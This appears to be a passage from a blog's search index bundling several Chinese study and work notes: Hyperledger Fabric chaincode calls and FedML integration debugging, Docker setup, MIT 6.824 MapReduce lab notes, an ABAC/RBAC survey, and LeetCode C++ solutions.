peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;NewRound&quot;, &quot;r1&quot;, &quot;2&quot;]}'peer chaincode invoke -o orderer.fedfab.com:7050 --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;AddModel&quot;, &quot;r1&quot;, &quot;c1&quot;, &quot;{\\&quot;a\\&quot;:[1,2,3], \\&quot;b\\&quot;:[2,3,4], \\&quot;c\\&quot;:[3,4,5]}&quot;]}'peer chaincode invoke -o orderer.fedfab.com:7050 --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;QueryWetherAllReceived&quot;, &quot;r1&quot;]}'peer chaincode invoke -o orderer.fedfab.com:7050 --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;AddModel&quot;, &quot;r1&quot;, &quot;c2&quot;, &quot;{\\&quot;a\\&quot;:[1,2,3], \\&quot;b\\&quot;:[2,3,4], \\&quot;c\\&quot;:[3,4,5]}&quot;]}'peer chaincode invoke -o orderer.fedfab.com:7050 --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;QueryWetherAllReceived&quot;, &quot;r1&quot;]}'peer chaincode invoke -o orderer.fedfab.com:7050 --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;QueryAllReceived&quot;, &quot;r1&quot;]}'peer chaincode invoke -o orderer.fedfab.com:7050 --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;UpdateGlobal&quot;, &quot;s1&quot;, &quot;{\\&quot;a\\&quot;:[1,2,3], \\&quot;b\\&quot;:[2,3,4], \\&quot;c\\&quot;:[3,4,5]}&quot;]}' fedml拿到返回值后可能要进行两次json解析把模型变成json后,当作普通字符串作为请求发送,发送请求时有进行了依次json编码增加了json的转义字符,增加了冗余字符减少了ChainCode编写的复杂度 Server需要知道Client的id？ –不需要,QueryAll后对每个模型求平均就好,不需要发送给Client 更新同名的ChainCode时,label要有变化,命令中的sequence参数要比上一次递增。 编写ts API与HTTP Server 根据上周的ttsacc的api和Http Server,相同的方法实现上面5个功能对应的api和接口 使用postMan进行测试 newRound调用时,client_num使用string 编写并测试Yaml-Requests的yaml配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263url: '10.128.196.184'port: '3000'methods: AddModel: type: 'post' async: false res-type: 'json' path: '/invokeChainCode/AddModel' params: peer: 0 org: 2 body: content-type: 'json' content: cid: 'c1' QueryWetherAllReceived: type: 'post' async: false res-type: 'json' path: '/invokeChainCode/QueryWetherAllReceived' params: peer: 0 org: 2 body: content-type: 'json' QueryAllReceived: type: 'post' async: false res-type: 'json' path: '/invokeChainCode/QueryAllReceived' params: peer: 0 org: 2 body: content-type: 'json' UpdateGlobal: type: 'post' async: false res-type: 'json' path: '/invokeChainCode/UpdateGlobal' params: peer: 0 org: 2 body: content-type: 'json' content: sid: 's1' NewRound: type: 'post' async: false res-type: 'json' path: '/invokeChainCode/NewRound' params: peer: 0 org: 2 body: content-type: 'json' content: client_num: '3' fedml中调用api 根据之前的分析，在对应位置进行调用，并处理返回值 编写dockerfile 创建自定义镜像,修改镜像中的fedml代码 使用镜像创建container,在container中运行修改后的代码进行测试修改过的文件有：123456/home/tt/.local/lib/python3.10/site-packages/fedml/cross_silo/client/fedml_client_master_manager.py/home/tt/.local/lib/python3.10/site-packages/fedml/cross_silo/server/fedml_aggregator.py/home/tt/.local/lib/python3.10/site-packages/fedml/cross_silo/server/fedml_server_manager.py/home/tt/.local/lib/python3.10/site-packages/fedml/cross_silo/server/fedml_server_manager.py/home/tt/.local/lib/python3.10/site-packages/fedml/cross_silo/client/message_define.py/home/tt/.local/lib/python3.10/site-packages/fedml/cross_silo/server/message_define.py docker COPYCOPY 遵循的规则 src路径必须在构建的上下文中 src是目录 则复制目录的全部内容,包括文件系统元数据 不会复制目录本身,只会复制其内容 src是任何其他类型的文件 则将其与其元数据一起单独复制 dest 以斜杠 / 结尾,它将被视为一个目录,并且 src 的内容将写入 dest/base(src) 指定了多个 src 资源,或者由于使用了通配符 则 dest 必须是一个目录,并且必须以斜杠 / 结尾 dest 不以斜杠结尾 它将被视为常规文件,并且 src 的内容将写入 dest dest 不存在 路径中所有缺失的目录都会自动创建 docker 错误记录1Error response from daemon: could not select device driver &quot;&quot; with capabilities: [[gpu]] 解决方法 12345678curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | \\ sudo apt-key add -distribution=$(. /etc/os-release;echo $ID$VERSION_ID)curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | \\ sudo tee /etc/apt/sources.list.d/nvidia-docker.listsudo apt-get updatesudo apt-get install -y nvidia-container-toolkitsudo systemctl restart docker 如果上面出错了,先使用下面的命令 1sudo rm -f $(grep -l &quot;nvidia.github.io&quot; /etc/apt/sources.list.d/* | grep -vE &quot;/nvidia-container-toolkit.list\\$&quot;) dockerfile 文件1234567891011FROM fedml/fedml:cuda-11.4.0-devel-ubuntu20.04## RUN sudo apt upgrade python3RUN python -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --upgrade pipRUN pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simpleRUN pip3 install updateRUN pip3 install --upgrade fedmlCOPY ./fedml_files/fedml_client_master_manager.py /usr/local/lib/python3.8/dist-packages/fedml/cross_silo/client/COPY ./fedml_files/fedml_aggregator.py /usr/local/lib/python3.8/dist-packages/fedml/cross_silo/server/COPY ./fedml_files/fedml_server_manager.py /usr/local/lib/python3.8/dist-packages/fedml/cross_silo/server/COPY ./fedml_files/message_define.py /usr/local/lib/python3.8/dist-packages/fedml/cross_silo/server/COPY ./fedml_files/message_define.py /usr/local/lib/python3.8/dist-packages/fedml/cross_silo/client/ 编译dockerfile的脚本 123456## docker image rm fedml:ttcp ~/.local/lib/python3.10/site-packages/fedml/cross_silo/client/fedml_client_master_manager.py ../fedml_dockerfile_context/fedml_files/cp ~/.local/lib/python3.10/site-packages/fedml/cross_silo/server/fedml_aggregator.py ../fedml_dockerfile_context/fedml_files/cp ~/.local/lib/python3.10/site-packages/fedml/cross_silo/server/fedml_server_manager.py ../fedml_dockerfile_context/fedml_files/cp ~/.local/lib/python3.10/site-packages/fedml/cross_silo/server/message_define.py ../fedml_dockerfile_context/fedml_files/docker build -t fedml:tt ../fedml_dockerfile_context 运行测试问题： 会随机有几个请求被拒绝连接 减少出块时间到50ms 依然没有解决修改configtx.yaml中的一个参数 1BatchTimeout: 50ms 给invoke函数加Mutex互斥锁,让其只能按顺序执行,锁解除后在sleep 65ms 依然没有解决 观察到观察到MVCC_READ_CONFLICT总是在AddModel总是在AddModel, 时出现 在Client发送Model前,sleep(1*client_real_id),排队依次上传,给区块链反应的时间（假设模型训练时间都差不多） 还是没有解决 总结 经过多天的debug与调试,最终基本可以正常训练,存储到区块链上,但是最多只训练了44轮,还是在AddModel环节出现了MVCC_READ_CONFLICT。 很多地方要增加sleep操作,增加了运行时间 需要一个协调方式,避免同时AddModel造成BlockChain崩溃。 可以尝试用Server调用AddModel,Client的本地Model还是通过MQTT协议传送给Server,由Server统一上链 或者可以捕获异常,保证server持续运行,Client发现Add失败则重新Add 寻找方法将请求串行化 最新进展 解决了MVCC_READ_CONFLICT,fedml和fabric可以相互配合完成整个训练过程,并且不发生MVCC_READ_CONFLICT等问题 新定义三个mqtt消息1234## tt defineMSG_TYPE_C2S_ADD_MODEL_READY = 8MSG_TYPE_C2S_ADD_MODEL_SEND = 9MSG_TYPE_S2C_START_ADD_MODEL = 10 解释： MSG_TYPE_C2S_ADD_MODEL_READY, Client to Server,训练完毕,可以向区块链发送AddModel。知会Server,server的Aggregator收集这个信息 MSG_TYPE_S2C_START_ADD_MODEL, Server to Client, 当全部ready时,会向Client开始依次发送这个消息。 MSG_TYPE_C2S_ADD_MODEL_SEND, Client to Server,当一个Client将Model发送到Chain后,发送这个消息到Server,Server收到后向下一个Client发送MSG_TYPE_S2C_START_ADD_MODEL消息,让下一个Client开始上传模型 方法带来的问题与思考： 由于invoke函数的mutex锁和刻意的延迟,以及上面通过三个信号实现的排队向ChainCode发送模型,导致整个系统运行的速度非常慢 有些节点算力强,训练快,有些算力低训练慢。 只有训练速度相似的节点会竞争AddModel的权利,而现在要让所有的Client都训练完成后才开始上传区块链,这样一定程度上降低了系统的效率 解决方法（设想）： 维护一个队列ready,一个变量sending,一个字典send ready表示目前收到ready的Client sending表示当前正在发送但没收到send消息的Client dict中存储ClientID to Bool,表示ClientID是否已经发送,即是否为send状态,将字典初始化全为False 收到Ci的ready消息后 若sending为None,则让Ci开始发送模型,将sending设为Ci 若sending不为None,加入ready队列 收到Ci的send消息后,将sending设为None,send[Ci]变成True,检测send字典是否全为True 若全为True,进行下一轮 若不全为True 若ready队列不为空,则从队列中取出下一个Client Cj让其发送模型,sending设为Cj 若ready队列为空,则继续等待ready消息","link":"/home/2022/10/22/fedfab/fedml/4.%E4%B8%8Efabric%E9%80%9A%E4%BF%A1/"},{"title":"6.824-lab1-Mapreduce","text":"Intro实验目的 实现一个MapReduce调度器(Coordinator) 准备工作 下载源码 1git clone git://g.csail.mit.edu/6.824-golabs-2021 6.824 串行运行 word-count123456cd ./6.824cd src/maingo build -race -buildmode=plugin ../mrapps/wc.gorm mr-out*go run -race mrsequential.go wc.so pg*.txtmore mr-out-0 我的任务修改mr/coordinator.go, mr/worker.go, mr/rpc.go，实现coordinator和worker 运行方式 编译并运行coordinator 123go build -race -buildmode=plugin ../mrapps/wc.go rm mr-out*go run -race mrcoordinator.go pg-*.txt 多开几个窗口跑worker 1go run -race mrworker.go wc.so 测试 1bash test-mr.sh 测试early exit1234567891011121314151617181920212223242526rm -f mr-*echo '***' Starting early exit test.timeout -k 2s 180s ../mrcoordinator ../pg*txt &amp;## give the coordinator time to create the sockets.sleep 1## start multiple workers.timeout -k 2s 180s ../mrworker ../../mrapps/early_exit.so &amp;timeout -k 2s 180s ../mrworker ../../mrapps/early_exit.so &amp;timeout -k 2s 180s ../mrworker ../../mrapps/early_exit.so &amp;## wait for any of the coord or workers to exit## `jobs` ensures that any completed old processes from other tests## are not waited uponjobs &amp;&gt; /dev/nullwait -n## 关键是这一行## a process has exited. this means that the output should be finalized## otherwise, either a worker or the coordinator exited earlysort mr-out* | grep . &gt; mr-wc-all-initial## wait for remaining workers and coordinator to exit.wait 这一行的作用是当上面任何一个线程中，第一个线程结束，则停止wait继续下面的脚本 也就是说，大家要一起退出，不能因为执行完任务了，也没有新任务了，就让worker结束12wait -n## 关键是这一行 一种可行的方法是当所有reduce任务结束后，直接退出，socket连接关闭，后面的worker心跳直接连接关闭的socket导致panic退出 但这样太不优雅 每个worker请求task时发送自己已经完成的reduce数如果coordinator收到了所有的reduce complete消息，维护一个变量reduce，此时每收到一个RequestTask消息reduce+=该客户端的reduce数，并发送finish消息，worker收到后立刻finishCoordinator的Done实现为，该reduce大于等于NReduce时，结束运行 job count test 检查某个job运行的次数是否正确 这个检测最初没有通过，就去看了测试脚本和源码 1234567891011121314151617181920212223echo '***' Starting job count test.rm -f mr-*timeout -k 2s 180s ../mrcoordinator ../pg*txt &amp;sleep 1timeout -k 2s 180s ../mrworker ../../mrapps/jobcount.so &amp;timeout -k 2s 180s ../mrworker ../../mrapps/jobcount.sotimeout -k 2s 180s ../mrworker ../../mrapps/jobcount.so &amp;timeout -k 2s 180s ../mrworker ../../mrapps/jobcount.soNT=`cat mr-out* | awk '{print $2}'`if [ &quot;$NT&quot; -ne &quot;8&quot; ]then echo '---' map jobs ran incorrect number of times &quot;($NT != 8)&quot; echo '---' job count test: FAIL failed_any=1else echo '---' job count test: PASSfiwait 简单分析可知，加载jobcount中的特殊map，reduce函数，使输出文件输出的是map的个数通过cat输出mr-out的所有文件，在使用awk输出mr-out的第二个参数(awk 'print $2') mrapps/crash.go12345678910111213141516171819202122232425262728var count intfunc Map(filename string, contents string) []mr.KeyValue { me := os.Getpid() f := fmt.Sprintf(&quot;mr-worker-jobcount-%d-%d&quot;, me, count) count++ err := ioutil.WriteFile(f, []byte(&quot;x&quot;), 0666) if err != nil { panic(err) } time.Sleep(time.Duration(2000+rand.Intn(3000)) * time.Millisecond) return []mr.KeyValue{mr.KeyValue{&quot;a&quot;, &quot;x&quot;}}}func Reduce(key string, values []string) string { files, err := ioutil.ReadDir(&quot;.&quot;) if err != nil { panic(err) } invocations := 0 for _, f := range files { // println(&quot;test, f =&quot;, f.Name(), strings.HasPrefix(f.Name(), &quot;mr-worker-jobcount&quot;)) if strings.HasPrefix(f.Name(), &quot;mr-worker-jobcount&quot;) { invocations++ } } return strconv.Itoa(invocations)} 分析这里的代码可知，每调用依次map，全局变量count就会++，并创建该worker的第count个文件在reduce中数当前目录下前缀为mr-worker-jobcount的文件个数就是map的个数 调试了自己的代码，map只调用了8次，reduce只调用了一次 注意到jobcount中使用了go已经弃用的ioutils包，改为os，问题解决 crash test12## mimic rpc.go's coordinatorSock()SOCKNAME=/var/tmp/824-mr-`id -u` 测试脚本要模仿Coordinator的Sock","link":"/home/2022/10/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/lab1/"},{"title":"MIT-6.824-notebook","text":"地址","link":"/home/2022/11/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.824/mit6.824notes/"},{"title":"ABAC 调研","text":"什么是ABAC、RBAC RBAC – role based access control 基于角色的访问控制，系统根据用户的角色判断用户是否具有权限 分类 Flat RBAC：每个员工至少被分配一个角色，但有些人可以拥有多个角色。如果有人想要访问新文件/资源​​/服务器，他们需要先获得一个新角色。 分层 RBAC：角色是根据资历级别定义的。除了自己的特权外，高级员工还拥有下属的特权。 受约束的 RBAC：该模型引入了职责分离 (SOD)。SOD 将执行任务的权限分散到多个用户，从而降低欺诈和/或风险活动的风险。例如，如果开发人员想要停用服务器，他们不仅需要直接经理的批准，还需要基础设施负责人的批准。这让基础设施负责人做出改变，拒绝有风险和/或不必要的请求。 对称 RBAC：定期审查所有组织角色。作为这些审查的结果，可能会分配或撤销特权，可能会添加或删除角色。 ABAC – attribute based access control 基于属性的访问控制，系统根据用户的属性判断权限，属性可能与用户、访问的资源、行为和环境等因素相关 优缺点 RBAC 优点 简易：定义角色比分配角色更容易 层级：更容易定义层次结构，上级拥有下级的权限 成本：角色较少时，实施成本低 缺点 角色爆炸：容易角色爆炸，导致要添加更多角色满足需求。在角色爆炸的情况下，将用户需求转换为角色可能是一项复杂的任务 ABAC 优点 细粒度：可以定义更加精细的控制策略，从大量的属性中进行选择 可扩展性：无需修改现有规则以适应新用户。管理员需要做的就是为新加入者分配相关属性。 易于维护：通过修改属性而不是定义新角色修改用户权限 缺点 资源：比RBAC更耗时，更多资源，经济成本更高 适用范围 ABAC 大型组织，支持可扩展性 需要根据环境，如地理位置，时间等因素判断权限 想要尽可能精细和灵活的访问控制策略 有时间、资源和预算来正确实施 ABAC RBAC 在中小型组织中 在您的组织内拥有定义明确的群体，并且应用广泛的、基于角色的策略是有意义的 实施访问控制策略的时间、资源和/或预算有限 不要有太多的外部贡献者，也不需要加入很多新人 fabric中对abac的支持 地址 abac api fabric数据增删改查 删除 123456789101112131415161718func (s *SmartContract) DeleteAsset(ctx contractapi.TransactionContextInterface, id string) error { asset, err := s.ReadAsset(ctx, id) if err != nil { return err } clientID, err := s.GetSubmittingClientIdentity(ctx) if err != nil { return err } if clientID != asset.Owner { return fmt.Errorf(&quot;submitting client not authorized to update asset, does not own asset&quot;) } return ctx.GetStub().DelState(id)}","link":"/home/2022/11/22/%E7%BB%84%E4%BC%9A/ABAC/"},{"title":"fabric 准入调研","text":"fabric ca 官方教程 fabric ca提供以下几个功能 注册, registration of identities, or connects to LDAP as the user registry 签发注册证书, issuance of Enrollment Certificates (ECerts) 证书续订和吊销, certificate renewal and revocation 负载平衡Hyperledger Fabric CA 客户端或 SDK 可以连接到 Hyperledger Fabric CA 服务器集群中的服务器。这在图表的右上角进行了说明。客户端路由到 HA 代理端点，该端点将流量负载平衡到其中一个结构服务器集群成员。 user注册使用fabric gateway123读取公钥私钥文件创建Identity与ca/peer建立grpc连接，获取fabric网络和contract 不使用fabric gateway1234读取connection-*.json的位置，（提前生成的ccp对象）获取ca，检查用户名是否已经注册获取adminIdentity注册，enroll 用户只需要提供自己的IDappUser，就可以生成访问区块链的身份 如果使用fabric gateway，需要peer的msp公钥私钥和证书 如果不使用fabric gateway，则需要用户端知道ca的访问账户和密码admin:adminpw 通过ca可以获得对contract的使用权，但是如果有其它业务，如果不用合约实现，可能需要传统的注册方式，并于ca的身份绑定","link":"/home/2022/11/22/%E7%BB%84%E4%BC%9A/Fabric%E5%87%86%E5%85%A5/"},{"title":"LeetCode-20","text":"1758. 生成交替二进制字符串的最少操作数1234567891011121314151617class Solution {public: int minOperations(string s) { int len = s.size(); return min(cal(s, len, true), cal(s, len, false)); } int cal(const string&amp; s, int len, bool flag) { int count = 0; for(int i = 0; i &lt; len; i++) { if(flag &amp;&amp; s[i] == '0' || !flag &amp;&amp; s[i] == '1') { count++; } flag = !flag; } return count; }}; 813. 最大平均值和的分组超时暴搜1234567891011121314151617181920212223class Solution {public: int len = 0; vector&lt;int&gt; sum; double largestSumOfAverages(vector&lt;int&gt;&amp; nums, int k) { len = nums.size(); sum = vector&lt;int&gt;(len+1, 0); for(int i = 1; i &lt;= len; i++) { sum[i] = nums[i-1] + sum[i-1]; } return search(nums, k, 1, 1, 0, 0); } double search(vector&lt;int&gt;&amp; nums, int k, int i, int K, double left_value, int last_j) { if(k == K || i == len) { return left_value + (sum[len] - sum[last_j] + 0.0) / (len - last_j); } return max(search(nums, k, i+1, K+1, left_value + (sum[i] - sum[last_j] + 0.0)/(i-last_j), i), search(nums, k,i+1, K, left_value, last_j)); } double max(double a, double b) { return a &gt; b ? a : b; }}; 昨天第一个思路是用排序，找出最大的m个数，这m个数恰好将数组分成k个部分，发现不可行。然后暴力搜索，超时了，暴搜时考虑添加隔板，其中left_value表示当前搜索下标i之前的分组平均值 类似背包12345678910111213141516171819202122232425262728class Solution {public: double largestSumOfAverages(vector&lt;int&gt;&amp; nums, int k) { int len = nums.size(); vector&lt;int&gt; sum(len+1, 0); vector&lt;vector&lt;double&gt;&gt; left_avg(k-1, vector&lt;double&gt;(len, 0)); for(int i = 1; i &lt;= len; i++) { sum[i] = nums[i-1] + sum[i-1]; } double maxx = sum[len] / (len + 0.0); if(k &lt;= 1) return maxx; for(int i = 1; i &lt; len; i++) { left_avg[0][i] = double(sum[i])/i; maxx = max(maxx, left_avg[0][i] + double(sum[len] - sum[i])/(len-i)); } for(int i = 0; i &lt; k-2; i++) { //第几个隔板 for(int j = i+1; j &lt; len; j++) { // 前一个隔板的位置 for(int p = j+1; p &lt; len; p++) { // 现在隔板的位置 maxx = max(left_avg[i][j] + double(sum[p] - sum[j])/(p-j) + double(sum[len] - sum[p])/(len-p), maxx); // left_avg + 当前隔板与上一个隔板的avg， 最后一个数到当前隔板的avg left_avg[i+1][p] = max(left_avg[i][j] + double(sum[p] - sum[j])/(p-j), left_avg[i+1][p]); // 更新avg } } } return maxx; }}; 今天考虑用类似背包的想法，结合暴力搜索的left_avg，用$ left_avg[i][j] $ ，表示添加i个隔板，在j之前的最大left_avg从第二个隔板开始，假设第i个隔板分别在位置 $j = i+1,i+2,i+3 …$ 时，第 $i+1$个隔板可以在 $p = j+1, j+2, …$计算前后两个隔板各种情况的最大值，更新left_avg，更新maxx 优化1234567891011121314151617181920212223242526272829class Solution {public: double largestSumOfAverages(vector&lt;int&gt;&amp; nums, int k) { int len = nums.size(); vector&lt;int&gt; sum(len+1, 0); for(int i = 1; i &lt;= len; i++) { sum[i] = nums[i-1] + sum[i-1]; } if(k &lt;= 1) return sum[len] / (len + 0.0); vector&lt;vector&lt;double&gt;&gt; left_avg(k-1, vector&lt;double&gt;(len, 0)); for(int i = 1; i &lt; len; i++) { left_avg[0][i] = double(sum[i])/i; } for(int i = 0; i &lt; k-2; i++) { for(int j = i+1; j &lt; len-1; j++) { for(int p = j+1; p &lt; len; p++) { left_avg[i+1][p] = max(left_avg[i][j] + double(sum[p] - sum[j])/(p-j), left_avg[i+1][p]); } } } double maxx = 0; for(int i = 0; i &lt; k-1; i++) { for(int j = 0; j &lt; len; j++) { maxx = max(left_avg[i][j]+double(sum[len] - sum[j])/(len-j), maxx); } } return maxx; }}; 减少maxx计算次数 1752. 检查数组是否经排序和轮转得到123456789101112class Solution {public: bool check(vector&lt;int&gt;&amp; nums) { int i = 1, j = 0; int len = nums.size(); while(i &lt; len &amp;&amp; nums[i-1] &lt;= nums[i]) i++; if(i == len) return true; j = i+1; while(j &lt; len &amp;&amp; nums[j-1] &lt;= nums[j]) j++; return j == len &amp;&amp; nums[len-1] &lt;= nums[0]; }}; 882. 细分图中的可到达节点暴搜超时12345678910111213141516171819202122232425262728293031323334353637383940class Solution {public: vector&lt;vector&lt;int&gt;&gt; graph; vector&lt;bool&gt; global_visited; int res = 0; vector&lt;vector&lt;int&gt;&gt; copy_edges; int reachableNodes(vector&lt;vector&lt;int&gt;&gt;&amp; edges, int maxMoves, int n) { int edge_size = edges.size(); graph = vector&lt;vector&lt;int&gt;&gt;(n); global_visited = vector&lt;bool&gt;(n, false); copy_edges = vector&lt;vector&lt;int&gt;&gt;(2,vector&lt;int&gt;(edge_size, 0)); for(int i = 0; i &lt; edge_size; i++) { graph[edges[i][0]].push_back(i); graph[edges[i][1]].push_back(i); } dfs(std::move(edges), 0, maxMoves); for(int i = 0; i &lt; edge_size; i++) { res += min(edges[i][2], copy_edges[0][i] + copy_edges[1][i]); } for(int i = 0; i &lt; n; i++) { if(global_visited[i]) { res++; } } return res; } void dfs(vector&lt;vector&lt;int&gt;&gt;&amp;&amp; edges, int node, int move) { global_visited[node] = true; if(move &lt;= 0) return; for(int e : graph[node]) { int w = edges[e][2]; int next = edges[e][0] == node ? edges[e][1] : edges[e][0]; int direction = edges[e][0] == node ? 0 : 1; copy_edges[direction][e] = max(min(w, move), copy_edges[direction][e]); if(move &gt; w) { dfs(std::move(edges), next, move-w-1); } } }}; djikstra-题解123456789101112131415161718192021222324252627282930313233343536373839404142class Solution {public: int encode(int u, int v, int n) { return u * n + v; } int reachableNodes(vector&lt;vector&lt;int&gt;&gt;&amp; edges, int maxMoves, int n) { vector&lt;vector&lt;pair&lt;int, int&gt;&gt;&gt; adList(n); for (auto &amp;edge : edges) { int u = edge[0], v = edge[1], nodes = edge[2]; adList[u].emplace_back(v, nodes); adList[v].emplace_back(u, nodes); } unordered_map&lt;int, int&gt; used; unordered_set&lt;int&gt; visited; int reachableNodes = 0; 